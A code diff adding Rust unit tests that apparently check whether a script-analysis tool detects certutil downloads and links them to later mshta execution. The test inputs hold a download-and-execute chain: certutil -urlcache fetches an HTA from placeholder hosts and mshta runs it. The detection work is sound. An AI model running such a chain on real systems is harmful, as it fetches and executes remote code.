@@ -8029,6 +8029,45 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_urlcache_tracks_implicit_url_basename_for_later_execution() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -urlcache -split -f https://certutil-default.example/payload.hta",
+            &mut env,
+        );
+        interpret_line("mshta payload.hta", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-default.example/payload.hta" && dst == "payload.hta"
+            )),
+            "implicit certutil destination was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("payload.hta"),
+                Some(FsEntry::Download { src })
+                    if src == "https://certutil-default.example/payload.hta"
+            ),
+            "implicit certutil destination was not tracked: {:?}",
+            env.modified_filesystem
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://certutil-default.example/payload.hta"
+            )),
+            "later mshta execution did not resolve downloaded HTA: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_decode_accepts_mixed_case_flags() {
         let mut env = Environment::new(&Config::default());
         let payload = "hello world";
@@ -18583,6 +18622,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert!(
             has,
             "schemeless certutil deob-text source was not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_implicit_basename_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "certutil -urlcache -split -f https://certutil-implicit-deob.example/payload.hta\r\nmshta payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::CertutilDownload { url, dst }
+                        if url == "https://certutil-implicit-deob.example/payload.hta"
+                            && dst == "payload.hta"
+                )
+            }),
+            "implicit certutil destination in deob text was not structured: {:?}",
             env.traits
         );
     }
